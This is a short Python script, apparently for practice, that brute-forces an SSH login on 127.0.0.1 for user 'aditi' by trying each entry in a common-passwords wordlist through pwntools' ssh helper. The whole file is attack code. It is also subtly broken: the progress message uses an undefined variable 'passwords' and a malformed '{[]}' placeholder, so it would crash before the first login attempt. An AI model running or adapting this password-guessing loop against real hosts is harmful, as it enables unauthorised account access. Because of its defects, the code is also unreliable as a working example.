from pwn import *
import paramiko
host="127.0.0.1"
username="aditi"
attempts=0

with open("ssh-common-passwords.txt","r") as password_list:
    for password in password_list:
        password= password.strip("\n")
        try:
            print("{[]} Attempting passwords: '{}' !".format(attempts,passwords))
            response= ssh(host=host, user=username, password= password, timeout=1)
            
            if response.connected():
                print("[>] Valid Password Found '{}' !".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password")
        attempts+=1
    

    
    
